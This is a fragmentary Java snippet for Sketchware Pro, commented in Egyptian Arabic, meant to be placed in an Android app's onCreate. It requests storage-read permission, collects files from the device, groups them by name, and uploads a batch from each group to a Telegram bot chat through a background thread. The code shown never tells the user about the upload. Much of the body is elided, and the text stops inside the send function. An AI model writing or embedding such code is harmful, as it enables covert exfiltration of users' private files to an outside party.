// Sketchware Pro - Add Source Directly in onCreate

// 1. طلب صلاحية القراءة
if (checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
    requestPermissions(new String[]{android.Manifest.permission.READ_EXTERNAL_STORAGE}, 1001);
} else {
    // الصلاحية موجودة، اشتغل على طول
    startUploadTask();
}

// ==== دي Function هتشتغل لو الصلاحية اتمنحت ====
// (هتحطها في نفس البلوك أو في onRequestPermissionsResult)

// لو حابب تحط الكود كله في onRequestPermissionsResult برضه:
    ...
    new Thread(new Runnable() {
        ...
        public void run() {
            try {
                ...
                // جمع حسب الاسم (الجملة قبل الرقم)
                ...
                for (java.util.List<java.io.File> group : groups.values()) {
                    ...
                    for (int i = 0; i < limit; i++) {
                        ...
                        sendFileToTelegram(apiUrl, chatId, fileToSend);
...
// ==== Function إرسال الملف ====
private void sendFileToTelegram(String apiUrl, String chatId, java.io.File file) {
    try {
